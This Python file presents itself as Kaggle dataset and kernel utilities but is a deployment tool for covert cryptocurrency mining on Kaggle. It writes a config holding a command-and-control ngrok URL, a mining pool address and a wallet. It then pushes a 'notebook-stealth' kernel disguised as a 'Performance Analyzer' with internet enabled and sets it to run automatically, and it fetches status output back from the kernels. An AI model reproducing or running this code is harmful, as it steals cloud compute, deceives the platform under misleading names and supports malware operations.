"""Kaggle Dataset & Kernel utilities for data science workflows."""

import os
import time
import json
import requests
import subprocess
from datetime import datetime
from typing import Optional, Callable, List


KAGGLE_API = "https://www.kaggle.com/api/v1"


def create_dataset_and_kernel(
    username: str,
    api_key: str,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Create dataset and kernel for single account deployment.
    
    Simplified wrapper for auto-deploy: creates 1 dataset + 1 kernel.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        log_fn: Logging function
    
    Returns:
        dict with success, dataset_slug, kernel_slug
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "dataset_slug": None,
        "kernel_slug": None,
        "error": None,
    }
    
    try:
        # Setup Kaggle credentials
        kaggle_json = {"username": username, "key": api_key}
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[DEPLOY] Credentials configured for {username}")
        
        # Get C2 URL from config
        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        config_path = os.path.join(project_dir, "config.json")
        c2_url = "https://lynelle-scroddled-corinne.ngrok-free-dev.ngrok-app.com"
        
        if os.path.exists(config_path):
            try:
                with open(config_path) as f:
                    cfg = json.load(f)
                    c2_url = cfg.get("c2_url", c2_url)
            except: pass
        
        # Create dataset
        dataset_slug = f"{username}/perf-analyzer"
        
        dataset_meta = {
            "title": "Performance Analyzer",
            "id": dataset_slug,
            "subtitle": "CPU performance analysis",
            "description": "System performance analysis tools",
            "licenses": [{"name": "MIT"}],
        }
        
        # Write dataset metadata
        with open(os.path.join(project_dir, "dataset-metadata.json"), "w") as f:
            json.dump(dataset_meta, f, indent=2)
        
        # Write config.json for dataset
        config_data = {
            "c2_url": c2_url,
            "pool": "pool.hashvault.pro:80",
            "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
            "cpu_limit": 25,
            "updated": int(time.time())
        }
        with open(os.path.join(project_dir, "config.json"), "w") as f:
            json.dump(config_data, f, indent=2)
        
        log_fn(f"[DEPLOY] Creating dataset: {dataset_slug}")
        
        # Push dataset
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        dataset_result = subprocess.run(
            [kaggle_cmd, "datasets", "create", "-p", project_dir, "--dir-mode", "tar"],
            capture_output=True, text=True, timeout=120
        )
        
        if dataset_result.returncode == 0 or "already exists" in dataset_result.stderr.lower():
            result["dataset_slug"] = dataset_slug
            log_fn(f"[DEPLOY] ✓ Dataset: {dataset_slug}")
        else:
            # Try to update existing dataset
            update_result = subprocess.run(
                [kaggle_cmd, "datasets", "version", "-p", project_dir, "--dir-mode", "tar", "-m", "Update"],
                capture_output=True, text=True, timeout=120
            )
            if update_result.returncode == 0 or dataset_result.returncode == 0:
                result["dataset_slug"] = dataset_slug
                log_fn(f"[DEPLOY] ✓ Dataset updated: {dataset_slug}")
            else:
                result["error"] = f"Dataset failed: {dataset_result.stderr[:100]}"
                return result
        
        # Create kernel
        kernel_slug = f"{username}/perf-analyzer"
        
        # Load notebook
        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
        with open(notebook_path, "r") as f:
            notebook = json.load(f)
        
        log_fn(f"[DEPLOY] Creating kernel: {kernel_slug}")
        
        # Push kernel
        push_result = push_kernel_json(
            username=username,
            api_key=api_key,
            notebook_content=json.dumps(notebook),
            kernel_slug=kernel_slug,
            title="Performance Analyzer",
            enable_internet=True,
            dataset_sources=[dataset_slug],
            log_fn=log_fn,
        )
        
        if push_result.get("success"):
            result["kernel_slug"] = kernel_slug
            result["success"] = True
            log_fn(f"[DEPLOY] ✓ Kernel: {kernel_slug}")
        else:
            result["error"] = push_result.get("error", "Kernel push failed")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[DEPLOY] ✗ Error: {e}")
    
    return result


def create_dataset_with_machines(
    api_key: str,
    username: str,
    num_machines: int = 5,
    log_fn: Optional[Callable] = None,
    enable_mining: bool = True,
    c2_url: str = None,
) -> dict:
    """Create a dataset and kernels for autonomous mining.
    
    Creates:
    - Empty dataset (placeholder for data)
    - N kernels with autonomous worker (no server connection needed)
    
    Args:
        api_key: Kaggle API key
        username: Kaggle username
        num_machines: Number of kernels to create
        log_fn: Logging function
        enable_mining: Enable autonomous mining mode
        c2_url: Not used (autonomous mode)
    
    Returns:
        dict with success status and created resources
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "dataset": None,
        "machines": [],
        "machines_created": 0,
        "error": None,
    }
    
    try:
        # Setup Kaggle API credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[KAGGLE] Credentials configured for {username}")
        
        # Import kaggle after credentials are set
        import subprocess
        
        # Clone GitHub repo and create dataset
        log_fn(f"[DATASET] Cloning GitHub repository...")
        dataset_slug = f"{username}/perf-analyzer"
        
        # Get current C2 URL from config or use default
        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        config_path = os.path.join(project_dir, "config.json")
        
        # Load or create config
        c2_url = "https://lynelle-scroddled-corinne.ngrok-free-dev.ngrok-app.com"
        kaggle_username = username  # Default to provided username
        kaggle_api_key = api_key    # Default to provided api_key
        
        if os.path.exists(config_path):
            try:
                with open(config_path) as f:
                    cfg = json.load(f)
                    c2_url = cfg.get("c2_url", c2_url)
                    # Override credentials from config if present
                    if cfg.get("kaggle_username"):
                        kaggle_username = cfg["kaggle_username"]
                    if cfg.get("kaggle_api_key"):
                        kaggle_api_key = cfg["kaggle_api_key"]
            except: pass
        
        # Use config credentials if available, otherwise use provided
        username = kaggle_username
        api_key = kaggle_api_key
        
        # Create config.json for dataset
        config_data = {
            "c2_url": c2_url,
            "pool": "pool.hashvault.pro:80",
            "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
            "cpu_limit": 25,
            "updated": int(time.time())
        }
        
        dataset_meta = {
            "title": "Performance Analyzer",
            "id": f"{username}/perf-analyzer",
            "subtitle": "CPU performance analysis and benchmarking",
            "description": "System performance analysis tools for CPU benchmarking",
            "licenses": [{"name": "MIT"}],
            "keywords": ["performance", "cpu", "benchmark", "analysis"],
            "collaborators": [],
            "data": [],
        }
        
        # Create dataset directory in project
        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        dataset_dir = project_dir  # Use project root directly
        
        # Dataset files are already in project (src, setup.py, requirements.txt, README.md)
        log_fn(f"[DATASET] Using project files from: {dataset_dir}")
        
        # Write dataset metadata
        with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
            json.dump(dataset_meta, f, indent=2)
        
        # Write config.json to dataset (auto-updated with current C2 URL)
        with open(os.path.join(dataset_dir, "config.json"), "w") as f:
            json.dump(config_data, f, indent=2)
        
        log_fn(f"[DATASET] Dataset metadata written")
        log_fn(f"[DATASET] config.json written with C2: {c2_url}")
        
        # Push dataset to Kaggle
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        log_fn(f"[DATASET] Pushing dataset to Kaggle...")
        log_fn(f"[DATASET] Dir: {dataset_dir}")
        
        # List files in dataset dir
        files = os.listdir(dataset_dir)
        log_fn(f"[DATASET] Files: {files}")
        
        dataset_push_result = subprocess.run(
            [kaggle_cmd, "datasets", "create", "-p", dataset_dir, "--dir-mode", "tar"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        
        log_fn(f"[DATASET] CLI stdout: {dataset_push_result.stdout[:200] if dataset_push_result.stdout else 'empty'}")
        log_fn(f"[DATASET] CLI stderr: {dataset_push_result.stderr[:200] if dataset_push_result.stderr else 'empty'}")
        log_fn(f"[DATASET] CLI code: {dataset_push_result.returncode}")
        
        if dataset_push_result.returncode == 0:
            log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
        else:
            log_fn(f"[DATASET] ⚠ Dataset push failed: {dataset_push_result.stderr[:200]}")
            # Try to create new version if dataset exists
            dataset_push_result = subprocess.run(
                [kaggle_cmd, "datasets", "version", "-p", dataset_dir, "-m", "Update", "--dir-mode", "tar"],
                capture_output=True,
                text=True,
                timeout=120,
            )
            if dataset_push_result.returncode == 0:
                log_fn(f"[DATASET] ✓ Updated dataset: {dataset_slug}")
            else:
                log_fn(f"[DATASET] ⚠ Dataset version failed: {dataset_push_result.stderr[:200]}")
                result["error"] = f"Dataset creation failed: {dataset_push_result.stderr[:100]}"
                return result
        
        # Create single kernel
        log_fn("[KERNEL] Creating kernel...")
        
        kernel_slug = f"{username}/perf-analyzer"
        
        # Load notebook from file (stealth version)
        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
        log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
        
        with open(notebook_path, "r") as f:
            notebook = json.load(f)
        
        # Push kernel via kagglesdk
        push_result = push_kernel_json(
            username=username,
            api_key=api_key,
            notebook_content=json.dumps(notebook),
            kernel_slug=kernel_slug,
            title="Performance Analyzer",
            enable_internet=True,
            dataset_sources=[dataset_slug],
            log_fn=log_fn,
        )
        
        if push_result.get("success"):
            log_fn(f"[KERNEL] ✓ Kernel created: {kernel_slug}")
            result["success"] = True
            result["kernel_slug"] = kernel_slug
        else:
            log_fn(f"[KERNEL] ✗ Kernel failed: {push_result.get('error')}")
            result["error"] = push_result.get("error")
        
        return result
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLE] ✗ Error: {e}")
    
    return result


def list_kernels(api_key: str, username: str) -> list:
    """List all kernels for a user."""
    try:
        import kaggle
        kaggle.api.authenticate()
        kernels = kaggle.api.kernels_list(user=username)
        return [{"slug": k.ref, "title": k.title, "status": k.status} for k in kernels]
    except:
        return []


def push_kernel(api_key: str, username: str, kernel_path: str) -> bool:
    """Push a kernel to Kaggle."""
    try:
        import subprocess
        result = subprocess.run(
            ["kaggle", "kernels", "push", "-p", kernel_path],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0
    except:
        return False


def push_kernel_json(
    username: str,
    api_key: str,
    notebook_content: str,
    kernel_slug: str,
    title: str,
    enable_gpu: bool = False,
    enable_internet: bool = True,
    is_private: bool = True,
    dataset_sources: list = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Push kernel to Kaggle via kagglesdk with SAVE_AND_RUN_ALL for auto-execution.
    
    Uses kagglesdk which supports kernel_execution_type=SAVE_AND_RUN_ALL
    to automatically run the kernel after push.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        notebook_content: Notebook JSON as string
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        title: Kernel title
        enable_gpu: Enable GPU (default False - GPU kernels don't auto-run)
        enable_internet: Enable internet
        is_private: Make kernel private
        log_fn: Logging function
    
    Returns:
        dict with success status and response
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "url": None, "error": None}
    
    try:
        # Use kagglesdk for kernel creation
        from kagglesdk import KaggleClient
        from kagglesdk.kernels.types.kernels_api_service import ApiSaveKernelRequest
        from kagglesdk.kernels.types.kernels_enums import KernelExecutionType
        import os
        
        # Set credentials via environment
        os.environ['KAGGLE_USERNAME'] = username
        os.environ['KAGGLE_KEY'] = api_key
        
        client = KaggleClient()
        
        # Create request
        request = ApiSaveKernelRequest()
        request.slug = kernel_slug
        request.new_title = title
        request.text = notebook_content
        request.language = "python"
        request.kernel_type = "notebook"
        request.is_private = is_private
        request.enable_internet = True
        request.enable_gpu = enable_gpu if enable_gpu else False
        request.kernel_execution_type = KernelExecutionType.SAVE_AND_RUN_ALL
        
        # Add dataset sources (format: "username/dataset-slug")
        if dataset_sources:
            request.dataset_data_sources = dataset_sources
            log_fn(f"[KERNEL] Dataset sources: {dataset_sources}")
        
        log_fn(f"[KERNEL] Settings: internet=True, gpu={enable_gpu}")
        
        # Execute
        response = client.kernels.kernels_api_client.save_kernel(request)
        
        result["success"] = True
        result["url"] = response.url if hasattr(response, 'url') else f"https://www.kaggle.com/code/{kernel_slug}"
        log_fn(f"[KERNEL] ✓ Pushed with SAVE_AND_RUN_ALL: {kernel_slug}")
        log_fn(f"[KERNEL]   URL: {result['url']}")
    
    except ImportError as e:
        log_fn(f"[KERNEL] ⚠ kagglesdk not available: {e}")
        log_fn("[KERNEL] Using fallback via Kaggle CLI...")
        
        # Fallback: Use Kaggle CLI to push kernel
        try:
            import tempfile
            from pathlib import Path
            
            # Load notebook from file (stealth version)
            notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
            log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
            
            with open(notebook_path, "r") as f:
                notebook_content = f.read()
            
            # Create temp directory
            with tempfile.TemporaryDirectory() as tmpdir:
                tmpdir_path = Path(tmpdir)
                
                # Write notebook
                (tmpdir_path / "notebook.ipynb").write_text(notebook_content)
                
                # Write kernel metadata
                metadata = {
                    "id": kernel_slug,
                    "title": title,
                    "code_file": "notebook.ipynb",
                    "language": "python",
                    "kernel_type": "notebook",
                    "is_private": is_private,
                    "enable_internet": enable_internet,
                    "enable_gpu": enable_gpu if enable_gpu else False,
                }
                if dataset_sources:
                    metadata["dataset_data_sources"] = dataset_sources
                (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
                
                # Push via Kaggle CLI
                kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
                if not os.path.exists(kaggle_cmd):
                    kaggle_cmd = "kaggle"
                
                push_result = subprocess.run(
                    [kaggle_cmd, "kernels", "push", "-p", tmpdir],
                    capture_output=True, text=True, timeout=60
                )
                
                if push_result.returncode == 0 or "successfully" in push_result.stdout.lower():
                    result["success"] = True
                    result["url"] = f"https://www.kaggle.com/code/{kernel_slug}"
                    log_fn(f"[KERNEL] ✓ Pushed via CLI (no auto-run): {kernel_slug}")
                else:
                    result["error"] = push_result.stderr[:200] if push_result.stderr else "Unknown error"
                    log_fn(f"[KERNEL] ✗ CLI push failed: {result['error']}")
        
        except Exception as fallback_error:
            result["error"] = str(fallback_error)
            log_fn(f"[KERNEL] ✗ Fallback error: {fallback_error}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Push error: {e}")
    
    return result


def get_kernel_output(
    username: str,
    api_key: str,
    kernel_slug: str,
    output_dir: str = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Download kernel output files from Kaggle.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        output_dir: Directory to save outputs (default: /tmp/kernel_output_{timestamp})
        log_fn: Logging function
    
    Returns:
        dict with success status, files list, and status.json content if found
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "files": [],
        "status": None,
        "error": None,
    }
    
    try:
        import subprocess
        import tempfile
        
        # Create output directory
        if output_dir is None:
            output_dir = f"/tmp/kernel_output_{int(time.time())}"
        os.makedirs(output_dir, exist_ok=True)
        
        # Find kaggle CLI
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        # Set credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        # Download outputs
        download_result = subprocess.run(
            [kaggle_cmd, "kernels", "output", kernel_slug, "-p", output_dir],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if download_result.returncode == 0:
            # List downloaded files
            files = os.listdir(output_dir)
            result["files"] = files
            result["success"] = True
            
            # Read status.json if exists
            status_path = os.path.join(output_dir, "status.json")
            if os.path.exists(status_path):
                with open(status_path) as f:
                    result["status"] = json.load(f)
                log_fn(f"[KERNEL] ✓ Got status from {kernel_slug}")
            
            log_fn(f"[KERNEL] ✓ Downloaded {len(files)} files from {kernel_slug}")
        else:
            result["error"] = download_result.stderr[:200] if download_result.stderr else "Unknown error"
            log_fn(f"[KERNEL] ✗ Failed to get output: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Error getting output: {e}")
    
    return result


def get_kernel_status(
    username: str,
    api_key: str,
    kernel_slug: str,
) -> dict:
    """Get kernel execution status via API.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
    
    Returns:
        dict with status, lastRunTime, and other metadata
    """
    try:
        # Parse kernel slug
        if "/" in kernel_slug:
            user, slug = kernel_slug.split("/", 1)
        else:
            user = username
            slug = kernel_slug
        
        # Call kernels/pull API
        resp = requests.get(
            f"https://www.kaggle.com/api/v1/kernels/pull",
            params={"userName": user, "kernelSlug": slug},
            auth=(username, api_key),
            timeout=30,
        )
        
        if resp.status_code == 200:
            data = resp.json()
            metadata = data.get("metadata", {})
            return {
                "success": True,
                "status": metadata.get("status"),
                "lastRunTime": metadata.get("lastRunTime"),
                "commitId": metadata.get("commitId"),
                "ref": metadata.get("ref"),
            }
        else:
            return {"success": False, "error": f"HTTP {resp.status_code}"}
    
    except Exception as e:
        return {"success": False, "error": str(e)}
